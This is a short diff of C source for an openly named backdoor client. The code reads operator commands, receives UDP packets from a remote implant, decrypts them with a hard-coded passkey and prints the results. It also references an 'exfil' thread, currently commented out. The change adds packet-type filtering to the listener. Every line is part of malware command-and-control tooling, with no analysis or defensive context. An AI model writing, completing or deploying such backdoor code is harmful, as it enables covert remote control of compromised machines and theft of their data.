@@ -43,7 +43,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}
 
 	// exfil thread
-//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
+	//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -65,7 +65,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		pthread_join(list_thread, NULL);
 	}
 
-//	pthread_join(exfil_thread, NULL);
+	//	pthread_join(exfil_thread, NULL);
 }
 
 void *listen_thread(void *arg)
@@ -86,16 +86,22 @@ void *listen_thread(void *arg)
 	{
 		char *dec;
 		int len;
+		char type;
 
 		socklen_t size = sizeof(saddr);
 		len = recvfrom(sock, buff, MAX_LEN, 0, (struct sockaddr*)&saddr, &size);
 
-		dec = decrypt(PASSKEY, buff, len);
-		memcpy(buff, dec, len);
-		free(dec);
+		dec = getTransmission(buff, &len, &type);
 
-		buff[len] = 0x0;
-		printf("%s", buff);
+		if (type == RSP_TYP)
+		{
+			dec = decrypt(PASSKEY, dec, len);
+			memcpy(buff, dec, len);
+			free(dec);
+
+			buff[len] = 0x0;
+			printf("%s", buff);
+		}
 	}
 
 	return NULL;
